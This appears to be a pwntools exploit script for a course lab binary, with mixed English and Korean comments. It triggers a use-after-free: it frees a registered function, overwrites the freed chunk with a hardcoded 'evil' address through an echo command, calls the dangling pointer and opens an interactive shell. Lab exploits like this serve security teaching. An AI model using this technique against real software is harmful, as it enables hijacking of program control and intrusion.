from pwn import *

p = process('/home/lab11/tut11-2-uaf/target')

context.log_level = 'debug'

# 1. Register a safe function
p.sendline(b'1')

# 2. Remove the registered function (free memory)
p.sendline(b'2')

# 3. Echo를 이용해 힙 메모리 조작
evil_address = p64(0x0000000000401521)  # 힙에 evil 주소 삽입
echo_payload = evil_address + b'\x00'  # fgets로 읽히도록 개행 추가
p.sendline(b'4')
p.sendlineafter('Enter message to echo', echo_payload)

# 4. Call the registered function (trigger UAF)
p.sendline(b'3')

# 쉘 유지
p.interactive()